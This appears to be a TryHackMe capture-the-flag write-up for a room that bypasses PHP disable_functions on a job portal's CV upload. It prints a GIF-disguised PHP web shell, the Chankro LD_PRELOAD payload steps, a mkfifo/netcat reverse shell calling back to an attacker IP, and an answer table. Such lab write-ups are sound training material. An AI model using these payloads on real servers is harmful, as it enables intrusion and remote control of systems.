# Bypass Functions

{% embed url="https://tryhackme.com/room/bypassfunctions" %}

PHP `disable_functions` bypass using `LD_PRELOAD` via the Chankro tool. The target runs a job application portal with a CV upload page that blocks PHP execution functions — but not `putenv()` and `mail()`.

---

## Recon

```bash
nmap -sC -sV MACHINE_IP
```

| Port | Service |
|---|---|
| 22 | SSH |
| 80 | Apache (job portal — cv.php) |

The app blocks `system()`, `exec()`, `shell_exec()`, `passthru()` via `disable_functions`. But `putenv()` and `mail()` are still available.

---

## Upload Filter Bypass

Direct PHP upload is rejected with "Upload a real image". Bypass it by prepending GIF magic bytes:

```
GIF89a;
<?php system($_GET['cmd']); ?>
```

But even if we get PHP executed, `disable_functions` blocks execution. We need Chankro.

---

## LD_PRELOAD via Chankro

Chankro generates a PHP file that abuses `putenv()` + `mail()` to load a malicious shared library via `LD_PRELOAD`, bypassing `disable_functions` entirely.

```bash
git clone https://github.com/TarlogicSecurity/Chankro.git
cd Chankro
```

Create the reverse shell command:

```bash
# cmd.sh
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc YOUR_IP 4444 > /tmp/f
```

Generate the payload:

```bash
python2 chankro.py --arch 64 --input cmd.sh --output payload.php --path /var/www/html/
```

Upload `payload.php` through the `cv.php` form.

---

## Get Shell & Flag

Start the listener:

```bash
nc -lvnp 4444
```

Navigate to the uploaded file:

```
http://MACHINE_IP/uploads/payload.php
```

Shell lands as `www-data`. Find the flag:

```bash
find / -name flag.txt 2>/dev/null
cat /path/to/flag.txt
```

---

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What functions are disabled? | `system`, `exec`, `shell_exec`, `passthru` |
| What bypass technique is used? | `LD_PRELOAD` via `putenv()` + `mail()` (Chankro) |
| Upload bypass method | GIF magic bytes prepended to PHP file |
| Flag | Retrieved from `flag.txt` on the target after getting shell |
